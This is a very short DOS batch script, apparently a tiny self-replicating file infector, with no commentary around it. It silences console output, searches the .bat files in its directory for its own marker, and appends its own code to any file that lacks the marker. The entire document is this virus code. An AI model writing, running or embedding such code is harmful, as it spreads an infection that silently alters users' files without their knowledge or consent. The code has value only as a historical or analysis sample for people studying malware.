@ctty nul
for %%i in (*.bat) do set !_!=%%i
for %%q in (*.bat) do find "!_!" %%q
if errorlevel 1 type %0 >> %!_!%
